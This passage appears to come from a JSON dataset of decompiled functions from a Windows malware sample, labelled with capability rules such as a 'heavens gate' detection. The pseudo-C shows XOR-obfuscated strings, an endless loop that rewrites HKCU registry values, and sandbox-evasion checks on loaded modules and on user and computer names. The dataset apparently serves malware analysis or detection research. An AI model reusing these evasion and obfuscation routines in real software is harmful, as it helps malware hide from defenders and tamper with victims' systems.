0x46;\n    var_190h = 0x49;\n    var_18fh = 0x4f;\n    fcn.004012a0(0x13);\n    for (var_80h = 0; var_80h < 0x13; var_80h = var_80h + 1) {\n        fcn.00401280(var_80h, var_218h[var_80h] ^ *(&var_194h + var_80h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_49ch._0_1_ = 0x26;\n    var_49ch._1_1_ = 0x2a;\n    var_49ch._2_1_ = 0x2a;\n    var_49ch._3_1_ = 0;\n    var_498h = 0x56;\n    var_497h = 4;\n    var_496h = 0x10;\n    var_495h = 0x2e;\n    var_494h = 0x10;\n    var_493h = 0xb;\n    var_492h = 0x62;\n    var_491h = 0x19;\n    var_490h = 7;\n    var_48fh = 0x24;\n    var_48eh = 10;\n    var_48dh = 0;\n    var_48ch = 0x52;\n    var_48bh = 0x25;\n    var_48ah = 0x10;\n    var_489h = 0x3b;\n    var_488h = 0x33;\n    var_487h = 0x1c;\n    var_486h = 0x5c;\n    var_485h = 0;\n    var_484h = 0x1c;\n    var_483h = 0x23;\n    var_482h = 6;\n    var_481h = 9;\n    var_480h = 0x50;\n    var_47fh = 0x76;\n    var_19ch._0_1_ = 0x75;\n    var_19ch._1_1_ = 0x4f;\n    var_19ch._2_1_ = 99;\n    var_19ch._3_1_ = 0x6e;\n    var_198h = 0x35;\n    var_197h = 0x76;\n    fcn.004012a0(0x1e);\n    for (var_84h = 0; var_84h < 0x1e; var_84h = var_84h + 1) {\n        fcn.00401280(var_84h, *(&var_49ch + var_84h) ^ *(&var_19ch + var_84h % 6));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_240h[0] = 0x16;\n    var_240h[1] = 0x2f;\n    var_240h[2] = 0x16;\n    var_240h[3] = 0x5c;\n    var_23ch = 0x28;\n    var_23bh = 0x20;\n    var_23ah = 0x10;\n    var_239h = 0x2d;\n    var_238h = 0x5b;\n    var_237h = 0x20;\n    var_236h = 0x15;\n    var_235h = 0x38;\n    var_234h = 0x2b;\n    var_233h = 0x43;\n    var_232h = 0x2c;\n    var_231h = 0x29;\n    var_230h = 0x2f;\n    var_22fh = 0x25;\n    var_22eh = 0x50;\n    var_22dh = 0x45;\n    var_d4h._0_1_ = 0x45;\n    var_d4h._1_1_ = 0x4a;\n    var_d4h._2_1_ = 0x42;\n    var_d4h._3_1_ = 0x35;\n    var_d0h = 0x45;\n    fcn.004012a0(0x14);\n    for (var_88h = 0; var_88h < 0x14; var_88h = var_88h + 1) {\n        fcn.00401280(var_88h, var_240h[var_88h] ^ *(&var_d4h + var_88h % 5));\n    }\n    uVar2 = arg_8h;\n    uVar1 = fcn.00401270();\n    fcn.00424640(uVar1, uVar2);\n    var_4bch[0] = 0xb;\n    var_4bch[1] = 0x52;\n    var_4bch[2] = 0x2a;\n    var_4bch[3] = 0x47;\n    var_4b8h = 7;\n    var_4b7h = 0x27;\n    var_4b6h = 0x2c;\n    var_4b5h = 0x52;\n    var_4b4h = 0x3a;\n    var_4b3h = 0x4c;\n    var_4b2h = 0xf;\n    var_4b1h = 0x24;\n    var_4b0h = 0x37;\n    var_4afh = 0x5b;\n    var_4aeh = 0;\n    var_4adh = 0x56;\n    var_4ach = 0x2e;\n    var_4abh = 0x2f;\n    var_4aah = 0x36;\n    var_4a9h = 0x5c;\n    var_4a8h = 0x39;\n    var_4a7h = 0x47;\n    var_4a6h = 0xb;\n    var_4a5h = 0x30;\n    var_4a4h = 0x31;\n    var_4a3h = 0x5b;\n    var_4a2h = 0xc;\n    var_4a1h = 0x52;\n    var_4a0h = 7;\n    var_49fh = 0x46;\n    var_1a4h[0] = 0x58;\n    var_1a4h[1] = 0x37;\n    var_1a4h[2] = 0x69;\n    var_1a4h[3] = 0x35;\n    var_1a0h = 0x62;\n    var_19fh = 0x46;\n    fcn.004012a0(0x1e);\n    for (var_8ch = 0; var_8ch < 0x1e; var_8ch = var_8ch + 1) {\n        fcn.00401280(var_8ch, var_4bch[var_8ch] ^ var_1a4h[var_8ch % 6]);\n    }\n    uVar2 = fcn.00401270();\n    fcn.00424640(uVar2, arg_8h);\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 24759
    },
    "00409850": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409b18)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409850(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_180h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uint8_t var_14h [4];\n    uchar var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_7ch = 0;\n    puVar3 = &var_180h;\n    for (iVar2 = 0x104; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_6ch._0_1_ = 3;\n    var_6ch._1_1_ = 0x2e;\n    var_6ch._2_1_ = 0xf;\n    var_6ch._3_1_ = 0x13;\n    var_68h = 0x1b;\n    var_67h = 0x20;\n    var_66h = 0x22;\n    var_65h = 0x24;\n    var_64h = 0x35;\n    var_63h = 0x2a;\n    var_62h = 5;\n    var_61h = 0x22;\n    var_60h = 0x22;\n    var_5fh = 0x2e;\n    var_5eh = 0x1a;\n    var_5dh = 8;\n    var_5ch = 10;\n    var_5bh = 0x35;\n    var_5ah = 0xc;\n    var_59h = 0x16;\n    var_58h = 0;\n    var_57h = 9;\n    var_56h = 8;\n    var_55h = 0x2e;\n    var_54h = 0x27;\n    var_53h = 0x32;\n    var_52h = 0x35;\n    var_51h = 0x24;\n    var_50h = 0x19;\n    var_4fh = 0x33;\n    var_4eh = 0x22;\n    var_4dh = 0x24;\n    var_4ch = 7;\n    var_4bh = 0x13;\n    var_4ah = 0x3a;\n    var_49h = 0x24;\n    var_48h = 0x22;\n    var_47h = 0x32;\n    var_46h = 0;\n    var_45h = 8;\n    var_44h = 2;\n    var_43h = 0x1d;\n    var_42h = 0x19;\n    var_41h = 0x2f;\n    var_40h = 0x1d;\n    var_3fh = 2;\n    var_3eh = 0x1e;\n    var_3dh = 0x2f;\n    var_3ch = 0x35;\n    var_3bh = 0x35;\n    var_3ah = 0x49;\n    var_39h = 0x34;\n    var_38h = 9;\n    var_37h = 0x35;\n    var_36h = 0x24;\n    var_35h = 0x28;\n    var_34h = 7;\n    var_33h = 0;\n    var_32h = 0x1f;\n    var_31h = 0x1d;\n    var_30h = 10;\n    var_2fh = 0x2e;\n    var_2eh = 7;\n    var_2dh = 2;\n    var_2ch = 0x1f;\n    var_2bh = 0x1d;\n    var_2ah = 0x75;\n    var_29h = 0x25;\n    var_28h = 0x35;\n    var_27h = 0x67;\n    var_1ch._0_1_ = 0x50;\n    var_1ch._1_1_ = 0x41;\n    var_1ch._2_1_ = 0x69;\n    var_1ch._3_1_ = 0x67;\n    var_18h = 0x6c;\n    var_17h = 0x41;\n    fcn.004012a0(0x46);\n    for (var_4h = 0; var_4h < 0x46; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_6ch + var_4h) ^ *(&var_1ch + var_4h % 6));\n    }\n    var_14h[0] = 0x56;\n    var_14h[1] = 0x7c;\n    var_14h[2] = 0x77;\n    var_14h[3] = 0x72;\n    var_10h = 0x32;\n    var_24h[0] = 100;\n    var_24h[1] = 0x49;\n    var_24h[2] = 0x47;\n    var_24h[3] = 0x42;\n    var_20h = 0x32;\n    var_1fh = 99;\n    fcn.004012a0(5);\n    for (var_8h = 0; var_8h < 5; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, var_14h[var_8h] ^ var_24h[var_8h % 6]);\n    }\n    do {\n        for (var_ch = 0; var_ch < 5; var_ch = var_ch + 1) {\n            var_70h = 0;\n            uVar1 = fcn.00401270(var_ch);\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_180h, uVar1);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_180h, &var_70h);\n            if (iVar2 == 0) {\n                var_7ch = 3;\n                uVar1 = fcn.00401270(0, 4, &var_7ch, 4);\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_70h, uVar1);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_70h);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 2112
    },
    "00411d20": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00411d20(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint var_300h;\n    uint var_2fch;\n    uint var_2f8h;\n    uint var_2f4h;\n    uint var_2f0h;\n    uint var_2ech;\n    uint pcbBuffer;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uchar var_2a0h;\n    uchar var_29fh;\n    uchar var_29eh;\n    uchar var_29dh;\n    uchar var_29ch;\n    uchar var_29bh;\n    uchar var_29ah;\n    uchar var_299h;\n    uchar var_298h;\n    uchar var_297h;\n    uchar var_296h;\n    uchar var_295h;\n    uchar var_294h;\n    uchar var_293h;\n    uchar var_292h;\n    uchar var_291h;\n    uchar var_290h;\n    uchar var_28fh;\n    uchar var_28eh;\n    uchar var_28dh;\n    uchar var_28ch;\n    uchar var_28bh;\n    uchar var_28ah;\n    uchar var_289h;\n    uchar var_288h;\n    uchar var_287h;\n    uchar var_286h;\n    uchar var_285h;\n    uchar var_284h;\n    uchar var_283h;\n    uchar var_282h;\n    uchar var_281h;\n    uchar var_280h;\n    uchar var_27fh;\n    uchar var_27eh;\n    uchar var_27dh;\n    uchar var_27ch;\n    uchar var_27bh;\n    uint var_278h;\n    uchar var_274h;\n    uchar var_273h;\n    uchar var_272h;\n    uchar var_271h;\n    uchar var_270h;\n    uchar var_26fh;\n    uchar var_26eh;\n    uchar var_26dh;\n    uchar var_26ch;\n    uchar var_26bh;\n    uchar var_26ah;\n    uchar var_269h;\n    uchar var_268h;\n    uchar var_267h;\n    uchar var_266h;\n    uchar var_265h;\n    uchar var_264h;\n    uchar var_263h;\n    uchar var_262h;\n    uchar var_261h;\n    uchar var_260h;\n    uchar var_25fh;\n    uchar var_25eh;\n    uchar var_25dh;\n    uint8_t var_25ch [4];\n    uchar var_258h;\n    uchar var_257h;\n    uchar var_256h;\n    uchar var_255h;\n    uchar var_254h;\n    uchar var_253h;\n    uchar var_252h;\n    uchar var_251h;\n    uchar var_250h;\n    uchar var_24fh;\n    uchar var_24eh;\n    uchar var_24dh;\n    uchar var_24ch;\n    uchar var_24bh;\n    uchar var_24ah;\n    uchar var_249h;\n    uchar var_248h;\n    uchar var_247h;\n    uchar var_246h;\n    uchar var_245h;\n    uint var_244h;\n    uchar var_240h;\n    uchar var_23fh;\n    uchar var_23eh;\n    uchar var_23dh;\n    uchar var_23ch;\n    uchar var_23bh;\n    uchar var_23ah;\n    uchar var_239h;\n    uchar var_238h;\n    uchar var_237h;\n    uchar var_236h;\n    uchar var_235h;\n    uchar var_234h;\n    uchar var_233h;\n    uchar var_232h;\n    uchar var_231h;\n    uchar var_230h;\n    uchar var_22fh;\n    uchar var_22eh;\n    uchar var_22dh;\n    uint var_22ch;\n    uchar var_228h;\n    uchar var_227h;\n    uchar var_226h;\n    uchar var_225h;\n    uchar var_224h;\n    uchar var_223h;\n    uchar var_222h;\n    uchar var_221h;\n    uchar var_220h;\n    uchar var_21fh;\n    uchar var_21eh;\n    uchar var_21dh;\n    uchar var_21ch;\n    uchar var_21bh;\n    uchar var_21ah;\n    uchar var_219h;\n    uchar var_218h;\n    uchar var_217h;\n    uchar var_216h;\n    uchar var_215h;\n    uint var_214h;\n    uchar var_210h;\n    uchar var_20fh;\n    uchar var_20eh;\n    uchar var_20dh;\n    uchar var_20ch;\n    uchar var_20bh;\n    uchar var_20ah;\n    uchar var_209h;\n    uchar var_208h;\n    uchar var_207h;\n    uchar var_206h;\n    uchar var_205h;\n    uchar var_204h;\n    uchar var_203h;\n    uint var_200h;\n    uchar var_1fch;\n    uchar var_1fbh;\n    uchar var_1fah;\n    uchar var_1f9h;\n    uchar var_1f8h;\n    uchar var_1f7h;\n    uchar var_1f6h;\n    uchar var_1f5h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uchar var_1f1h;\n    uchar var_1f0h;\n    uchar var_1efh;\n    uint var_1ech;\n    uchar var_1e8h;\n    uchar var_1e7h;\n    uchar var_1e6h;\n    uchar var_1e5h;\n    uchar var_1e4h;\n    uchar var_1e3h;\n    uchar var_1e2h;\n    uchar var_1e1h;\n    uchar var_1e0h;\n    uchar var_1dfh;\n    uchar var_1deh;\n    uchar var_1ddh;\n    uchar var_1dch;\n    uchar var_1dbh;\n    uint8_t var_1d8h [4];\n    uchar var_1d4h;\n    uchar var_1d3h;\n    uchar var_1d2h;\n    uchar var_1d1h;\n    uchar var_1d0h;\n    uchar var_1cfh;\n    uchar var_1ceh;\n    uchar var_1cdh;\n    uchar var_1cch;\n    uchar var_1cbh;\n    uchar var_1cah;\n    uchar var_1c9h;\n    uchar var_1c8h;\n    uint var_1c4h;\n    uchar var_1c0h;\n    uchar var_1bfh;\n    uchar var_1beh;\n    uchar var_1bdh;\n    uchar var_1bch;\n    uchar var_1bbh;\n    uchar var_1bah;\n    uchar var_1b9h;\n    uchar var_1b8h;\n    uchar var_1b7h;\n    uchar var_1b6h;\n    uchar var_1b5h;\n    uchar var_1b4h;\n    uint var_1b0h;\n    uchar var_1ach;\n    uchar var_1abh;\n    uchar var_1aah;\n    uchar var_1a9h;\n    uchar var_1a8h;\n    uchar var_1a7h;\n    uchar var_1a6h;\n    uchar var_1a5h;\n    uint var_1a4h;\n    uchar var_1a0h;\n    uchar var_19fh;\n    uchar var_19eh;\n    uchar var_19dh;\n    uchar var_19ch;\n    uchar var_19bh;\n    uchar var_19ah;\n    uchar var_199h;\n    uint var_198h;\n    uchar var_194h;\n    uchar var_193h;\n    uchar var_192h;\n    uchar var_191h;\n    uchar var_190h;\n    uchar var_18fh;\n    uchar var_18eh;\n    uchar var_18dh;\n    uint8_t var_18ch [4];\n    uchar var_188h;\n    uchar var_187h;\n    uchar var_186h;\n    uchar var_185h;\n    uchar var_184h;\n    uchar var_183h;\n    uchar var_182h;\n    uint var_180h;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uint var_178h;\n    uchar var_174h;\n    uchar var_173h;\n    uchar var_172h;\n    uchar var_171h;\n    uint var_170h;\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uchar var_169h;\n    uint8_t var_168h [4];\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uint8_t var_160h [4];\n    uchar var_15ch;\n    uchar var_15bh;\n    uint var_158h;\n    uchar var_154h;\n    uchar var_153h;\n    uint var_150h;\n    uchar var_14ch;\n    uchar var_14bh;\n    uint var_148h;\n    uchar var_144h;\n    uchar var_143h;\n    uint var_140h;\n    uchar var_13ch;\n    uchar var_13bh;\n    uint var_138h;\n    uchar var_134h;\n    uchar var_133h;\n    uint var_130h;\n    uchar var_12ch;\n    uchar var_12bh;\n    uint var_128h;\n    uchar var_124h;\n    uchar var_123h;\n    uint var_120h;\n    uchar var_11ch;\n    uchar var_11bh;\n    uint var_118h;\n    uchar var_114h;\n    uchar var_113h;\n    uint8_t var_110h [4];\n    uchar var_10ch;\n    uchar var_10bh;\n    uint var_108h;\n    uchar var_104h;\n    uchar var_103h;\n    uint8_t var_100h [4];\n    uchar var_fch;\n    uchar var_fbh;\n    uint8_t var_f8h [4];\n    uchar var_f4h;\n    uchar var_f3h;\n    uint8_t var_f0h [4];\n    uchar var_ech;\n    uchar var_ebh;\n    uint var_e8h;\n    uchar var_e4h;\n    uint var_e0h;\n    uchar var_dch;\n    uint var_d8h;\n    uchar var_d4h;\n    uint var_d0h;\n    uchar var_cch;\n    uint var_c8h;\n    uchar var_c4h;\n    uint var_c0h;\n    uchar var_bch;\n    uint var_b8h;\n    uchar var_b4h;\n    uint var_b0h;\n    uchar var_ach;\n    uint var_a8h;\n    uchar var_a4h;\n    uint var_a0h;\n    uchar var_9ch;\n    uint var_98h;\n    uchar var_94h;\n    uint var_90h;\n    uchar var_8ch;\n    uint var_88h;\n    uchar var_84h;\n    uint var_80h;\n    uchar var_7ch;\n    uint var_78h;\n    uchar var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = fcn.00413870();\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_198h._0_1_ = 0x1e;\n    var_198h._1_1_ = 1;\n    var_198h._2_1_ = 0x33;\n    var_198h._3_1_ = 0x5f;\n    var_194h = 0x11;\n    var_193h = 10;\n    var_192h = 10;\n    var_191h = 0x4d;\n    var_190h = 0x30;\n    var_18fh = 0x5b;\n    var_18eh = 0x18;\n    var_18dh = 0x66;\n    var_108h._0_1_ = 0x7a;\n    var_108h._1_1_ = 99;\n    var_108h._2_1_ = 0x54;\n    var_108h._3_1_ = 0x37;\n    var_104h = 0x74;\n    var_103h = 0x66;\n    fcn.004012a0(0xc);\n    for (var_8h = 0; var_8h < 0xc; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_198h + var_8h) ^ *(&var_108h + var_8h % 6));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    var_1a4h._0_1_ = 5;\n    var_1a4h._1_1_ = 0x5b;\n    var_1a4h._2_1_ = 0x11;\n    var_1a4h._3_1_ = 0x27;\n    var_1a0h = 5;\n    var_19fh = 0x1a;\n    var_19eh = 0x55;\n    var_19dh = 0x56;\n    var_19ch = 0x26;\n    var_19bh = 0xd;\n    var_19ah = 0x1a;\n    var_199h = 0x39;\n    var_88h._0_1_ = 0x76;\n    var_88h._1_1_ = 0x39;\n    var_88h._2_1_ = 0x78;\n    var_88h._3_1_ = 0x42;\n    var_84h = 0x61;\n    fcn.004012a0(0xc);\n    for (var_ch = 0; var_ch < 0xc; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_1a4h + var_ch) ^ *(&var_88h + var_ch % 5));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar3);\n    if (iVar2 != 0) {\n        fcn.00411b90();\n    }\n    pcbBuffer = 0x400;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x437fa8, &pcbBuffer);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    var_1b0h._0_1_ = 0x11;\n    var_1b0h._1_1_ = 0x38;\n    var_1b0h._2_1_ = 0x44;\n    var_1b0h._3_1_ = 8;\n    var_1ach = 0x55;\n    var_1abh = 0x3c;\n    var_1aah = 0x39;\n    var_1a9h = 99;\n    var_1a8h = 9;\n    var_1a7h = 0x55;\n    var_1a6h = 0x20;\n    var_1a5h = 0x4d;\n    var_80h._0_1_ = 0x52;\n    var_80h._1_1_ = 0x4d;\n    var_80h._2_1_ = 0x36;\n    var_80h._3_1_ = 0x7a;\n    var_7ch = 0x30;\n    fcn.004012a0(0xc);\n    for (var_10h = 0; var_10h < 0xc; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_1b0h + var_10h) ^ *(&var_80h + var_10h % 5));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x437fa8, uVar3);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    var_170h._0_1_ = 0x2a;\n    var_170h._1_1_ = 0x29;\n    var_170h._2_1_ = 0x1a;\n    var_170h._3_1_ = 0xb;\n    var_16ch = 0xe;\n    var_16bh = 10;\n    var_16ah = 1;\n    var_169h = 0x48;\n    var_118h._0_1_ = 0x79;\n    var_118h._1_1_ = 0x48;\n    var_118h._2_1_ = 0x74;\n    var_118h._3_1_ = 0x6f;\n    var_114h = 0x6c;\n    var_113h = 0x65;\n    fcn.004012a0(8);\n    for (var_14h = 0; var_14h < 8; var_14h = var_14h + 1) {\n        fcn.00401280(var_14h, *(&var_170h + var_14h) ^ *(&var_118h + var_14h % 6));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x437fa8, uVar3);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    pcbBuffer = 0x400;\n    var_1ech._0_1_ = 0xc;\n    var_1ech._1_1_ = 0x6c;\n    var_1ech._2_1_ = 0x42;\n    var_1ech._3_1_ = 0x75;\n    var_1e8h = 0x3d;\n    var_1e7h = 0x74;\n    var_1e6h = 0x19;\n    var_1e5h = 0x33;\n    var_1e4h = 2;\n    var_1e3h = 0x53;\n    var_1e2h = 0x1d;\n    var_1e1h = 0x6c;\n    var_1e0h = 0x5d;\n    var_1dfh = 0x75;\n    var_1deh = 0x3c;\n    var_1ddh = 0x74;\n    var_1dch = 0x6c;\n    var_1dbh = 0x33;\n    var_78h._0_1_ = 0x74;\n    var_78h._1_1_ = 0x6c;\n    var_78h._2_1_ = 0x33;\n    var_78h._3_1_ = 0x75;\n    var_74h = 0x53;\n    fcn.004012a0(0x24);\n    for (var_18h = 0; var_18h < 0x12; var_18h = var_18h + 1) {\n        fcn.00401280(var_18h, *(&var_1ech + var_18h) ^ *(&var_78h + var_18h % 5));\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x437fa8, &pcbBuffer);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    var_200h._0_1_ = 0x1a;\n    var_200h._1_1_ = 0x78;\n    var_200h._2_1_ = 0x67;\n    var_200h._3_1_ = 0x74;\n    var_1fch = 6;\n    var_1fbh = 0x6c;\n    var_1fah = 0x1a;\n    var_1f9h = 0x78;\n    var_1f8h = 0x6e;\n    var_1f7h = 0x74;\n    var_1f6h = 0x55;\n    var_1f5h = 0x6c;\n    var_1f4h = 0x1d;\n    var_1f3h = 0x78;\n    var_1f2h = 0x31;\n    var_1f1h = 0x74;\n    var_1f0h = 0x75;\n    var_1efh = 0x6c;\n    var_110h[0] = 0x38;\n    var_110h[1] = 0x78;\n    var_110h[2] = 0x42;\n    var_110h[3] = 0x74;\n    var_10ch = 0x75;\n    var_10bh = 0x6c;\n    fcn.004012a0(0x24);\n    for (var_1ch = 0; var_1ch < 0x12; var_1ch = var_1ch + 1) {\n        fcn.00401280(var_1ch, *(&var_200h + var_1ch) ^ var_110h[var_1ch % 6]);\n    }\n    var_178h._0_1_ = 0x65;\n    var_178h._1_1_ = 0x27;\n    var_178h._2_1_ = 0x38;\n    var_178h._3_1_ = 0x10;\n    var_174h = 0x3b;\n    var_173h = 0x79;\n    var_172h = 0x3e;\n    var_171h = 0x76;\n    var_e8h._0_1_ = 0x36;\n    var_e8h._1_1_ = 0x66;\n    var_e8h._2_1_ = 0x76;\n    var_e8h._3_1_ = 0x54;\n    var_e4h = 0x79;\n    fcn.004012a0(8);\n    for (var_20h = 0; var_20h < 8; var_20h = var_20h + 1) {\n        fcn.00401280(var_20h, *(&var_178h + var_20h) ^ *(&var_e8h + var_20h % 5));\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x437fa8, uVar3);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    var_180h._0_1_ = 0x46;\n    var_180h._1_1_ = 0x60;\n    var_180h._2_1_ = 0xe;\n    var_180h._3_1_ = 0x38;\n    var_17ch = 0x24;\n    var_17bh = 0x13;\n    var_17ah = 0x30;\n    var_179h = 0x33;\n    var_100h[0] = 0x71;\n    var_100h[1] = 0x33;\n    var_100h[2] = 0x47;\n    var_100h[3] = 0x74;\n    var_fch = 0x72;\n    var_fbh = 0x5a;\n    fcn.004012a0(8);\n    for (var_24h = 0; var_24h < 8; var_24h = var_24h + 1) {\n        fcn.00401280(var_24h, *(&var_180h + var_24h) ^ var_100h[var_24h % 6]);\n    }\n    uVar3 = fcn.00401270();\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x437fa8, uVar3);\n    if (iVar2 == 0) {\n        fcn.00411b90();\n    }\n    var_278h._0_1_ = 1;\n    var_278h._1_1_ = 5;\n    var_278h._2_1_ = 0x14;\n    var_278h._3_1_ = 0x3c;\n    var_274h = 0x3b;\n    var_273h = 0x30;\n    var_272h = 0x1b;\n    var_271h = 1;\n    var_270h = 0x1a;\n    var_26fh = 0x3c;\n    var_26eh = 0x29;\n    var_26dh = 0x22;\n    var_26ch = 10;\n    var_26bh = 0x16;\n    var_26ah = 0xf;\n    var_269h = 0x28;\n    var_268h = 0x38;\n    var_267h = 0x38;\n    var_266h = 6;\n    var_265h = 10;\n    var_264h = 0x1a;\n    var_263h = 0x2b;\n    var_262h = 0x15;\n    var_261h = 2;\n    var_260h = 0x3d;\n    var_25fh = 0x21;\n    var_25eh = 0x2b;\n    var_25dh = 0x78;\n    var_f8h[0] = 0x49;\n    var_f8h[1] = 0x44;\n    var_f8h[2] = 0x46;\n    var_f8h[3] = 0x78;\n    var_f4h = 0x6c;\n    var_f3h = 0x71;\n    fcn.004012a0(0x1c);\n    for (var_28h = 0; var_28h < 0x1c; var_28h = var_28h + 1) {\n        fcn.00401280(var_28h, *(&var_278h + var_28h) ^ var_f8h[var_28h % 6]);\n    }\n    var_214h._0_1_ = 0x1c;\n    var_214h._1_1_ = 0x28;\n    var_214h._2_1_ = 0x24;\n    var_214h._3_1_ = 1;\n    var_210h = 0x2e;\n    var_20fh = 0x37;\n    var_20eh = 0xd;\n    var_20dh = 0x38;\n    var_20ch = 0x38;\n    var_20bh = 6;\n    var_20ah = 0x1d;\n    var_209h = 0x3f;\n    var_208h = 0x3d;\n    